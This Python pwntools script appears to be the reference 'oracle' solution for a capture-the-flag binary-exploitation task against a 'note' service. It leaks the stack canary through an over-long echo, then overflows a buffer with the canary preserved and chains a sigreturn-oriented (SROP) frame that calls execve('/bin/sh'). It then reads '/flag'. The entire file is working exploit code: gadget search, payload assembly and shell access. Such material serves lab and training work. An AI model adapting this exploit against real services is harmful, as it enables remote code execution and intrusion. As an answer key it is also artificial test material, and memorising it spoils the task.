#!/usr/bin/env python3
"""Oracle: leak canary via the raw 400-byte echo (cmd 1), then overflow with
the canary preserved (cmd 2) and SROP: pop rax=15 (rt_sigreturn), syscall;ret,
forged frame with rax=59 execve("/bin/sh"). Quit fires the chain."""

from pwn import ELF, SigreturnFrame, context, p64, remote

context.log_level = "error"
context.arch = "amd64"
e = ELF("/work/note/note", checksec=False)

POPTAB = {}
data = open("/work/note/note", "rb").read()
import struct

phoff = struct.unpack("<Q", data[0x20:0x28])[0]
phentsize, phnum = struct.unpack("<HH", data[0x36:0x3A])
segs = []
for i in range(phnum):
    p = phoff + i * phentsize
    ptype, flags = struct.unpack("<II", data[p : p + 8])
    offset, vaddr = struct.unpack("<QQ", data[p + 8 : p + 24])
    if ptype == 1 and flags & 1:
        segs.append((offset, vaddr))


def find_gadget(pat: bytes) -> int:
    i = data.find(pat)
    while i != -1:
        for o, v in segs:
            if o <= i and i < o + 0x200000:
                return v + (i - o)
        i = data.find(pat, i + 1)
    raise RuntimeError("gadget not found")


pop_rax = find_gadget(b"\x58\xc3")
syscall_ret = find_gadget(b"\x0f\x05\xc3")
sh = next(e.search(b"/bin/sh\x00"))

for pad in (152, 144, 136):
    try:
        r = remote("notes", 9999, timeout=10)
        r.recvuntil(b"> ")
        r.sendline(b"1")
        r.recvuntil(b"name?\n")
        r.send(b"LEAK\n")
        leak = r.recvn(403)[:400]
        canary = leak[pad : pad + 8]
        if len(canary) != 8 or canary[0] != 0:
            r.close()
            continue
        frame = SigreturnFrame()
        frame.rax = 59
        frame.rdi = sh
        frame.rsi = 0
        frame.rdx = 0
        frame.rip = syscall_ret
        payload = (
            b"A" * pad
            + canary
            + b"B" * 8
            + p64(pop_rax)
            + p64(15)
            + p64(syscall_ret)
            + bytes(frame)
        )
        r.recvuntil(b"> ")
        r.sendline(b"2")
        r.recvuntil(b"name?\n")
        r.send(payload)
        r.recvuntil(b"ok2\n")
        r.recvuntil(b"> ")
        r.sendline(b"3")
        r.recvuntil(b"bye\n")
        r.sendline(b"echo PWNED; cat /flag")
        out = r.recvall(timeout=8).decode(errors="replace")
        r.close()
        print(out)
        if "flag{" in out:
            break
    except Exception as exc:
        import traceback

        traceback.print_exc()
